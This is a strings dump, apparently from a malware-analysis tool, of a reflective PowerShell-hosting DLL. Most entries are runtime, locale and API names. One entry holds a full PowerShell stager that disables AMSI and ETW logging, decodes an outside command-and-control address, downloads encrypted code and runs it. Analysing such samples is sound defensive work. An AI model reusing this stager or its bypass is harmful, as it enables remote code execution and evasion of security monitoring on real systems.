                "__int64",
                "__int128",
                "<unknown>",
                "char8_t",
                "char16_t",
                "char32_t",
                "wchar_t",
                "auto",
                "decltype(auto)",
                "__w64 ",
                "UNKNOWN",
                "signed ",
                "const",
                " volatile",
                "`unknown ecsu'",
                "union ",
                "struct ",
                "class ",
                "coclass ",
                "cointerface ",
                "enum ",
                "const ",
                "cli::array<",
                "cli::pin_ptr<",
                "{flat}",
                "{for ",
                " ?? ",
                "FlsAlloc",
                "FlsFree",
                "FlsGetValue",
                "FlsSetValue",
                "InitializeCriticalSectionEx",
                "(null)",
                "CorExitProcess",
                "AreFileApisANSI",
                "CompareStringEx",
                "EnumSystemLocalesEx",
                "GetActiveWindow",
                "GetDateFormatEx",
                "GetEnabledXStateFeatures",
                "GetLastActivePopup",
                "GetLocaleInfoEx",
                "GetProcessWindowStation",
                "GetSystemTimePreciseAsFileTime",
                "GetTimeFormatEx",
                "GetUserDefaultLocaleName",
                "GetUserObjectInformationW",
                "GetXStateFeaturesMask",
                "IsValidLocaleName",
                "LCMapStringEx",
                "LCIDToLocaleName",
                "LocaleNameToLCID",
                "LocateXStateFeature",
                "MessageBoxA",
                "MessageBoxW",
                "RoInitialize",
                "RoUninitialize",
                "AppPolicyGetProcessTerminationMethod",
                "AppPolicyGetThreadInitializationType",
                "AppPolicyGetShowDeveloperDiagnostic",
                "AppPolicyGetWindowingModel",
                "SetThreadStackGuarantee",
                "SystemFunction036",
                "NAN(SNAN)",
                "nan(snan)",
                "NAN(IND)",
                "nan(ind)",
                "e+000",
                " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~",
                "Sunday",
                "Monday",
                "Tuesday",
                "Wednesday",
                "Thursday",
                "Friday",
                "Saturday",
                "January",
                "February",
                "March",
                "April",
                "June",
                "July",
                "August",
                "September",
                "October",
                "November",
                "December",
                "MM/dd/yy",
                "dddd, MMMM dd, yyyy",
                "HH:mm:ss",
                " !\"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~",
                " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~",
                "d8L2",
                "[aOni*{",
                "@2&@",
                "\"RP(",
                "eLK(w",
                "FEMh",
                "h0'D",
                "owM&",
                "~ $s%r",
                "@b;zO]",
                "$qE}",
                ";*xh",
                "[\"93",
                "iu+-,",
                "\\lo}",
                "obwQ4",
                "&Sgw",
                "?nz(",
                "=87M",
                "v2!L.2",
                "X/4B",
                "k=yI",
                "^<V7w",
                "W&|.",
                "1#INF",
                "1#QNAN",
                "1#SNAN",
                "1#IND",
                "UUUUUU",
                "TUUUU",
                "#Ib?",
                "=imb;D",
                "=W>6",
                ">[^j",
                ">Kb|",
                "+>De",
                "11Y@",
                "/>58d%",
                "MJ$>",
                ">cQ6",
                "!>6'Y",
                ">jtm}S",
                ">77:",
                ")>6{1n",
                "Vr.>T",
                "+f)>0'",
                "Lj[;>",
                "3>fvw",
                ";H9>&X",
                "*StO9>T",
                ".>Tu",
                ".(!>",
                "n03>Pu",
                "S9>H",
                "x.&>",
                "K~Je#>!",
                "-/!>",
                "(>aI",
                "=cQ6",
                "+M<7>",
                "*>f[",
                "o ->",
                "l(>>",
                "c(>\\,",
                "ET5>",
                ";>9l",
                "mG4>",
                "bp(=>?g",
                "36,>",
                "37>k",
                "~X3>",
                "6>J`",
                "?>!T",
                "BC?>6t9^",
                "8'>0",
                "'._M",
                "=4<,",
                "BF>^G",
                "K&>.yC",
                " 'L>[",
                ".xJ>Hf",
                "y\\PD>!",
                "|b=})>",
                "c [1>H'",
                "dL?>",
                "uzKs@>",
                "3>N;kU",
                "kE>fvw",
                "eF>t",
                "L>ev",
                "A>pP&",
                "V6E>`\"(5",
                ",=>B",
                "\">}t",
                "0iN>/",
                "+h->|",
                "@>%>b",
                "?qBJ",
                "l@6 ",
                "?-hk",
                "OZQ%",
                "-)4d",
                "?:kP<",
                "?UUUUUU",
                "?f`Y4",
                "?QY^&",
                "?U)#",
                "?ysB",
                "?$G4",
                "?30]",
                "?7zQ6$",
                "logf",
                "log10f",
                "log10",
                "sinh",
                "cosh",
                "tanh",
                "asin",
                "acos",
                "atan",
                "atan2",
                "sqrt",
                "ceil",
                "floor",
                "fabs",
                "modf",
                "ldexp",
                "_cabs",
                "_hypot",
                "fmod",
                "frexp",
                "_logb",
                "_nextafter",
                "RSDS",
                "9j%A",
                "C:\\Users\\User\\Downloads\\PowerTools-master\\PowerTools-master\\PowerPick\\bin\\x64\\Debug\\ReflectivePick.pdb",
                "ReflectivePick_x64.dll",
                "ReflectiveLoader",
                "VoidFunc",
                "`.rsrc",
                "BSJB",
                "v2.0.50727",
                "#Strings",
                "#GUID",
                "#Blob",
                "<Module>",
                "PowerShellRunner.dll",
                "CustomPSHost",
                "CustomPSHostUserInterface",
                "CustomPSRHostRawUserInterface",
                "mscorlib",
                "System",
                "Object",
                "System.Management.Automation",
                "System.Management.Automation.Host",
                "PSHost",
                "PSHostUserInterface",
                "PSHostRawUserInterface",
                "InvokePS",
                ".ctor",
                "Guid",
                "_hostId",
                "get_InstanceId",
                "get_Name",
                "Version",
                "get_Version",
                "get_UI",
                "System.Globalization",
                "CultureInfo",
                "get_CurrentCulture",
                "get_CurrentUICulture",
                "EnterNestedPrompt",
                "ExitNestedPrompt",
                "NotifyBeginApplication",
                "NotifyEndApplication",
                "SetShouldExit",
                "InstanceId",
                "Name",
                "CurrentCulture",
                "CurrentUICulture",
                "System.Text",
                "StringBuilder",
                "_rawUi",
                "ConsoleColor",
                "Write",
                "WriteLine",
                "WriteDebugLine",
                "WriteErrorLine",
                "WriteVerboseLine",
                "WriteWarningLine",
                "ProgressRecord",
                "WriteProgress",
                "get_Output",
                "System.Collections.Generic",
                "Dictionary`2",
                "PSObject",
                "System.Collections.ObjectModel",
                "Collection`1",
                "FieldDescription",
                "Prompt",
                "ChoiceDescription",
                "PromptForChoice",
                "PSCredential",
                "PSCredentialTypes",
                "PSCredentialUIOptions",
                "PromptForCredential",
                "get_RawUI",
                "ReadLine",
                "System.Security",
                "SecureString",
                "ReadLineAsSecureString",
                "Output",
                "RawUI",
                "Size",
                "_windowSize",
                "Coordinates",
                "_cursorPosition",
                "_cursorSize",
                "_foregroundColor",
                "_backgroundColor",
                "_maxPhysicalWindowSize",
                "_maxWindowSize",
                "_bufferSize",
                "_windowPosition",
                "_windowTitle",
                "get_BackgroundColor",
                "set_BackgroundColor",
                "get_BufferSize",
                "set_BufferSize",
                "get_CursorPosition",
                "set_CursorPosition",
                "get_CursorSize",
                "set_CursorSize",
                "FlushInputBuffer",
                "get_ForegroundColor",
                "set_ForegroundColor",
                "BufferCell",
                "Rectangle",
                "GetBufferContents",
                "get_KeyAvailable",
                "get_MaxPhysicalWindowSize",
                "get_MaxWindowSize",
                "KeyInfo",
                "ReadKeyOptions",
                "ReadKey",
                "ScrollBufferContents",
                "SetBufferContents",
                "get_WindowPosition",
                "set_WindowPosition",
                "get_WindowSize",
                "set_WindowSize",
                "get_WindowTitle",
                "set_WindowTitle",
                "BackgroundColor",
                "BufferSize",
                "CursorPosition",
                "CursorSize",
                "ForegroundColor",
                "KeyAvailable",
                "MaxPhysicalWindowSize",
                "MaxWindowSize",
                "WindowPosition",
                "WindowSize",
                "WindowTitle",
                "command",
                "exitCode",
                "foregroundColor",
                "backgroundColor",
                "value",
                "message",
                "sourceId",
                "record",
                "caption",
                "descriptions",
                "choices",
                "defaultChoice",
                "userName",
                "targetName",
                "allowedCredentialTypes",
                "options",
                "rectangle",
                "source",
                "destination",
                "clip",
                "fill",
                "origin",
                "contents",
                "System.Reflection",
                "AssemblyTitleAttribute",
                "AssemblyDescriptionAttribute",
                "AssemblyConfigurationAttribute",
                "AssemblyCompanyAttribute",
                "AssemblyProductAttribute",
                "AssemblyCopyrightAttribute",
                "AssemblyTrademarkAttribute",
                "AssemblyCultureAttribute",
                "System.Runtime.InteropServices",
                "ComVisibleAttribute",
                "GuidAttribute",
                "AssemblyVersionAttribute",
                "AssemblyFileVersionAttribute",
                "System.Diagnostics",
                "DebuggableAttribute",
                "DebuggingModes",
                "System.Runtime.CompilerServices",
                "CompilationRelaxationsAttribute",
                "RuntimeCompatibilityAttribute",
                "System.Management.Automation.Runspaces",
                "InitialSessionState",
                "CreateDefault",
                "AuthorizationManager",
                "set_AuthorizationManager",
                "RunspaceFactory",
                "Runspace",
                "CreateRunspace",
                "Open",
                "Pipeline",
                "CreatePipeline",
                "CommandCollection",
                "get_Commands",
                "AddScript",
                "Command",
                "get_Item",
                "PipelineResultTypes",
                "MergeMyResults",
                "Invoke",
                "IDisposable",
                "Dispose",
                "System.Threading",
                "Thread",
                "get_CurrentThread",
                "NotImplementedException",
                "NewGuid",
                "Append",
                "String",
                "Concat",
                "AppendLine",
                "ToString",
                "set_Width",
                "set_Height",
                "set_X",
                "set_Y",
                "n[u5",
                "Copyright ",
                "  2014",
                "$dfc4eebb-7384-4db5-9bad-257203029bd9",
                "1.0.0.0",
                "WrapNonExceptionThrows",
                "RSDSE@",
                "RmP>#",
                "e:\\Documents\\Visual Studio 2013\\Projects\\UnmanagedPowerShell\\PowerShellRunner\\obj\\Debug\\PowerShellRunner.pdb",
                "_CorDllMain",
                "mscoree.dll",
                "                          ",
                "abcdefghijklmnopqrstuvwxyz",
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                ".?AVbad_alloc@std@@",
                ".?AVexception@std@@",
                ".?AVbad_array_new_length@std@@",
                ".?AV_com_error@@",
                ".?AVbad_exception@std@@",
                ".?AVtype_info@@",
                ".?AVDNameNode@@",
                ".?AVcharNode@@",
                ".?AVpcharNode@@",
                ".?AVpDNameNode@@",
                ".?AVDNameStatusNode@@",
                ".?AVpairNode@@",
                "GetCurrentProcess",
                "WriteProcessMemory",
                "GetProcAddress",
                "LoadLibraryW",
                "KERNEL32.dll",
                "OLEAUT32.dll",
                "CLRCreateInstance",
                "GetCurrentThreadId",
                "IsDebuggerPresent",
                "RaiseException",
                "MultiByteToWideChar",
                "WideCharToMultiByte",
                "RtlCaptureContext",
                "RtlLookupFunctionEntry",
                "RtlVirtualUnwind",
                "UnhandledExceptionFilter",
                "SetUnhandledExceptionFilter",
                "TerminateProcess",
                "IsProcessorFeaturePresent",
                "QueryPerformanceCounter",
                "GetCurrentProcessId",
                "GetSystemTimeAsFileTime",
                "InitializeSListHead",
                "GetStartupInfoW",
                "GetModuleHandleW",
                "GetLastError",
                "HeapAlloc",
                "HeapFree",
                "GetProcessHeap",
                "VirtualQuery",
                "FreeLibrary",
                "LocalFree",
                "RtlUnwindEx",
                "RtlPcToFileHeader",
                "InterlockedPushEntrySList",
                "InterlockedFlushSList",
                "GetModuleFileNameW",
                "LoadLibraryExW",
                "SetLastError",
                "EncodePointer",
                "EnterCriticalSection",
                "LeaveCriticalSection",
                "DeleteCriticalSection",
                "InitializeCriticalSectionAndSpinCount",
                "TlsAlloc",
                "TlsGetValue",
                "TlsSetValue",
                "TlsFree",
                "ExitProcess",
                "GetModuleHandleExW",
                "GetDateFormatW",
                "GetTimeFormatW",
                "CompareStringW",
                "LCMapStringW",
                "GetLocaleInfoW",
                "IsValidLocale",
                "GetUserDefaultLCID",
                "EnumSystemLocalesW",
                "GetStdHandle",
                "GetFileType",
                "GetCurrentThread",
                "FindClose",
                "FindFirstFileExW",
                "FindNextFileW",
                "IsValidCodePage",
                "GetACP",
                "GetOEMCP",
                "GetCPInfo",
                "GetCommandLineA",
                "GetCommandLineW",
                "GetEnvironmentStringsW",
                "FreeEnvironmentStringsW",
                "SetEnvironmentVariableW",
                "SetConsoleCtrlHandler",
                "FlushFileBuffers",
                "WriteFile",
                "GetConsoleOutputCP",
                "GetConsoleMode",
                "SetStdHandle",
                "GetFileSizeEx",
                "SetFilePointerEx",
                "GetStringTypeW",
                "HeapSize",
                "HeapReAlloc",
                "CloseHandle",
                "ReadFile",
                "ReadConsoleW",
                "CreateFileW",
                "WriteConsoleW",
                "OutputDebugStringW",
                "RtlUnwind",
                "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>",
                "<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>",
                "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">",
                "    <security>",
                "      <requestedPrivileges>",
                "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />",
                "      </requestedPrivileges>",
                "    </security>",
                "  </trustInfo>",
                "</assembly>",
                "CLRCreateInstance failed w/hr 0x%08lx",
                "v4.0.30319",
                "ICLRMetaHost::GetRuntime failed w/hr 0x%08lx",
                "ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx",
                ".NET runtime v2.0.50727 cannot be loaded",
                "ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx",
                "CLR failed to start w/hr 0x%08lx",
                "ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx",
                "Failed to get default AppDomain w/hr 0x%08lx",
                "Failed to load the assembly w/hr 0x%08lx",
                "Failed to get the Type interface w/hr 0x%08lx",
                "If($PSVersionTable.PSVersion.Major -ge 3){$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$Ref.GetField('amsiInitFailed','NonPublic,Static').Setvalue($Null,$true);[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0);};[System.Net.ServicePointManager]::Expect100Continue=0;$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADQANgAuADEAOQAwAC4AMQAyADAALgAyADEANwA6ADEAMwAzADUA')));$t='/news.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('e.-1h+#~k3<*cJnjHdNz=7tVywWYSI%X');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add(\"Cookie\",\"jnjnWM=9o/lpkOL/7q+7KJ/hj8yJRaUyvU=\");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ",
                "amsi.dll",
                "SafeArrayPutElement failed w/hr 0x%08lx",
                "Failed to invoke InvokePS w/hr 0x%08lx",
                "Runtime Check Error.",
                " Unable to display RTC Message.",
                "bin\\amd64\\MSPDB140.DLL",
                "api-ms-win-core-registry-l1-1-0.dll",
                "advapi32.dll",
                "SOFTWARE\\Wow6432Node\\Microsoft\\VisualStudio\\14.0\\Setup\\VC",
                "ProductDir",
                "api-ms-win-core-fibers-l1-1-1",
                "api-ms-win-core-synch-l1-2-0",
                "kernel32",
                "api-ms-",
                "api-ms-win-core-datetime-l1-1-1",
                "api-ms-win-core-file-l1-2-2",
                "api-ms-win-core-localization-l1-2-1",
                "api-ms-win-core-localization-obsolete-l1-2-0",
                "api-ms-win-core-processthreads-l1-1-2",
                "api-ms-win-core-string-l1-1-0",
                "api-ms-win-core-sysinfo-l1-2-1",
                "api-ms-win-core-winrt-l1-1-0",
                "api-ms-win-core-xstate-l2-1-0",
                "api-ms-win-rtcore-ntuser-window-l1-1-0",
                "api-ms-win-security-systemfunctions-l1-1-0",
                "ext-ms-win-ntuser-dialogbox-l1-1-0",
                "ext-ms-win-ntuser-windowstation-l1-1-0",
                "advapi32",
                "ntdll",
                "api-ms-win-appmodel-runtime-l1-1-2",
                "user32",
                "ext-ms-",
                "LC_ALL",
                "LC_COLLATE",
                "LC_CTYPE",
                "LC_MONETARY",
                "LC_NUMERIC",
                "LC_TIME",
                "en-US",
                "ja-JP",
                "zh-CN",
                "ko-KR",
                "zh-TW",
                "         (((((                  H",
                "      (                          ",
                "zh-CHS",
                "ar-SA",
                "bg-BG",
                "ca-ES",
                "cs-CZ",
                "da-DK",
                "de-DE",
                "el-GR",
                "fi-FI",
                "fr-FR",
                "he-IL",
                "hu-HU",
                "is-IS",
                "it-IT",
                "nl-NL",
                "nb-NO",
                "pl-PL",
                "pt-BR",
                "ro-RO",
                "ru-RU",
                "hr-HR",
                "sk-SK",
                "sq-AL",
                "sv-SE",
                "th-TH",
                "tr-TR",
                "ur-PK",
                "id-ID",
                "uk-UA",
                "be-BY",
                "sl-SI",
                "et-EE",
                "lv-LV",
                "lt-LT",
                "fa-IR",
                "vi-VN",
                "hy-AM",
                "az-AZ-Latn",
                "eu-ES",
                "mk-MK",
                "tn-ZA",
                "xh-ZA",
                "zu-ZA",
                "af-ZA",
                "ka-GE",
                "fo-FO",
                "hi-IN",
                "mt-MT",
                "se-NO",
                "ms-MY",
                "kk-KZ",
                "ky-KG",
                "sw-KE",
                "uz-UZ-Latn",
                "tt-RU",
                "bn-IN",
                "pa-IN",
                "gu-IN",
                "ta-IN",
                "te-IN",
                "kn-IN",
                "ml-IN",
                "mr-IN",
                "sa-IN",
                "mn-MN",
                "cy-GB",
                "gl-ES",
                "kok-IN",
                "syr-SY",
                "div-MV",
                "quz-BO",
                "ns-ZA",
                "mi-NZ",
                "ar-IQ",
                "de-CH",
                "en-GB",
                "es-MX",
                "fr-BE",
                "it-CH",
                "nl-BE",
                "nn-NO",
                "pt-PT",
                "sr-SP-Latn",
                "sv-FI",
                "az-AZ-Cyrl",
                "se-SE",
                "ms-BN",
                "uz-UZ-Cyrl",
                "quz-EC",
                "ar-EG",
                "zh-HK",
                "de-AT",
                "en-AU",
                "es-ES",
                "fr-CA",
                "sr-SP-Cyrl",
                "se-FI",
                "quz-PE",
                "ar-LY",
                "zh-SG",
                "de-LU",
                "en-CA",
                "es-GT",
                "fr-CH",
                "hr-BA",
                "smj-NO",
                "ar-DZ",
                "zh-MO",
                "de-LI",
                "en-NZ",
                "es-CR",
                "fr-LU",
                "bs-BA-Latn",
                "smj-SE",
                "ar-MA",
                "en-IE",
                "es-PA",
                "fr-MC",
                "sr-BA-Latn",
                "sma-NO",
                "ar-TN",
                "en-ZA",
                "es-DO",
                "sr-BA-Cyrl",
                "sma-SE",
                "ar-OM",
                "en-JM",
                "es-VE",
                "sms-FI",
                "ar-YE",
                "en-CB",
                "es-CO",
                "smn-FI",
                "ar-SY",
                "en-BZ",
                "es-PE",
                "ar-JO",
                "en-TT",
                "es-AR",
                "ar-LB",
                "en-ZW",
                "es-EC",
                "ar-KW",
                "en-PH",
                "es-CL",
                "ar-AE",
                "es-UY",
                "ar-BH",
                "es-PY",
                "ar-QA",
                "es-BO",
                "es-SV",
                "es-HN",
                "es-NI",
                "es-PR",
                "zh-CHT",
                "af-za",
                "ar-ae",
                "ar-bh",
                "ar-dz",
                "ar-eg",
                "ar-iq",
                "ar-jo",
                "ar-kw",
                "ar-lb",
                "ar-ly",
                "ar-ma",
                "ar-om",
                "ar-qa",
                "ar-sa",
                "ar-sy",
                "ar-tn",
                "ar-ye",
                "az-az-cyrl",
                "az-az-latn",
                "be-by",
                "bg-bg",
                "bn-in",
                "bs-ba-latn",
                "ca-es",
                "cs-cz",
                "cy-gb",
                "da-dk",
                "de-at",
                "de-ch",
                "de-de",
                "de-li",
                "de-lu",
                "div-mv",
                "el-gr",
                "en-au",
                "en-bz",
                "en-ca",
                "en-cb",
                "en-gb",
                "en-ie",
                "en-jm",
                "en-nz",
                "en-ph",
                "en-tt",
                "en-us",
                "en-za",
                "en-zw",
                "es-ar",
                "es-bo",
                "es-cl",
                "es-co",
                "es-cr",
                "es-do",
                "es-ec",
                "es-es",
                "es-gt",
                "es-hn",
                "es-mx",
                "es-ni",
                "es-pa",
                "es-pe",
                "es-pr",
                "es-py",
                "es-sv",
                "es-uy",
                "es-ve",
                "et-ee",
                "eu-es",
                "fa-ir",
                "fi-fi",
                "fo-fo",
                "fr-be",
                "fr-ca",
                "fr-ch",
                "fr-fr",
                "fr-lu",
                "fr-mc",
                "gl-es",
                "gu-in",
                "he-il",
                "hi-in",
                "hr-ba",
                "hr-hr",
                "hu-hu",
                "hy-am",
                "id-id",
                "is-is",
                "it-ch",
                "it-it",
                "ja-jp",
                "ka-ge",
                "kk-kz",
                "kn-in",
                "kok-in",
                "ko-kr",
                "ky-kg",
                "lt-lt",
                "lv-lv",
                "mi-nz",
                "mk-mk",
                "ml-in",
                "mn-mn",
                "mr-in",
                "ms-bn",
                "ms-my",
                "mt-mt",
                "nb-no",
                "nl-be",
                "nl-nl",
                "nn-no",
                "ns-za",
                "pa-in",
                "pl-pl",
                "pt-br",
                "pt-pt",
                "quz-bo",
                "quz-ec",
                "quz-pe",
                "ro-ro",
                "ru-ru",
                "sa-in",
                "se-fi",
                "se-no",
                "se-se",
                "sk-sk",
                "sl-si",
                "sma-no",
                "sma-se",
                "smj-no",
                "smj-se",
                "smn-fi",
                "sms-fi",
                "sq-al",
                "sr-ba-cyrl",
                "sr-ba-latn",
                "sr-sp-cyrl",
                "sr-sp-latn",
                "sv-fi",
                "sv-se",
                "sw-ke",
                "syr-sy",
                "ta-in",
                "te-in",
                "th-th",
                "tn-za",
                "tr-tr",
                "tt-ru",
                "uk-ua",
                "ur-pk",
                "uz-uz-cyrl",
                "uz-uz-latn",
                "vi-vn",
                "xh-za",
                "zh-chs",
                "zh-cht",
                "zh-cn",
                "zh-hk",
                "zh-mo",
                "zh-sg",
                "zh-tw",
                "zu-za",
                "american",
                "american english",
                "american-english",
                "australian",
                "belgian",
                "canadian",
                "chinese",
                "chinese-hongkong",
                "chinese-simplified",
                "chinese-singapore",
                "chinese-traditional",
                "dutch-belgian",
                "english-american",
                "english-aus",
                "english-belize",
                "english-can",
                "english-caribbean",
                "english-ire",
                "english-jamaica",
                "english-nz",
                "english-south africa",
                "english-trinidad y tobago",
                "english-uk",
                "english-us",
                "english-usa",
                "french-belgian",
                "french-canadian",
                "french-luxembourg",
                "french-swiss",
                "german-austrian",
                "german-lichtenstein",
                "german-luxembourg",
                "german-swiss",
                "irish-english",
                "italian-swiss",
                "norwegian",
                "norwegian-bokmal",
                "norwegian-nynorsk",
                "portuguese-brazilian",
                "spanish-argentina",
                "spanish-bolivia",
                "spanish-chile",
                "spanish-colombia",
                "spanish-costa rica",
                "spanish-dominican republic",
                "spanish-ecuador",
                "spanish-el salvador",
                "spanish-guatemala",
                "spanish-honduras",
                "spanish-mexican",
                "spanish-modern",
                "spanish-nicaragua",
                "spanish-panama",
                "spanish-paraguay",
                "spanish-peru",
                "spanish-puerto rico",
                "spanish-uruguay",
                "spanish-venezuela",
                "swedish-finland",
                "swiss",
                "america",
                "britain",
                "china",
                "czech",
                "england",
                "great britain",
                "holland",
                "hong-kong",
                "new-zealand",
                "pr china",
                "pr-china",
                "puerto-rico",
                "slovak",
                "south africa",
                "south korea",
                "south-africa",
                "south-korea",
                "trinidad & tobago",
                "united-kingdom",
                "united-states",
                "utf8",
                "utf-8",
                "Runtime Error!",
                "Program: ",
                "<program name unknown>",
                "Microsoft Visual C++ Runtime Library",
                "CONOUT$",
                "out-default",
                "EnterNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "ExitNestedPrompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "DEBUG: ",
                "ERROR: ",
                "VERBOSE: ",
                "WARNING: ",
                "Prompt is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "PromptForChoice is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "PromptForCredential1 is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "PromptForCredential2 is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "ReadLine is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "ReadLineAsSecureString is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "FlushInputBuffer is not implemented.",
                "GetBufferContents is not implemented.",
                "KeyAvailable is not implemented.",
                "ReadKey is not implemented.  The script is asking for input, which is a problem since there's no console.  Make sure the script can execute without prompting the user for input.",
                "ScrollBufferContents is not implemented",
                "SetBufferContents is not implemented.",
                "SetBufferContents is not implemented",
                "VS_VERSION_INFO",
                "VarFileInfo",
                "Translation",
                "StringFileInfo",
                "000004b0",
                "FileDescription",
                "FileVersion",
                "InternalName",
                "LegalCopyright",
                "OriginalFilename",
                "ProductName",
                "ProductVersion",
                "Assembly Version"
            ]
        }
    ]
}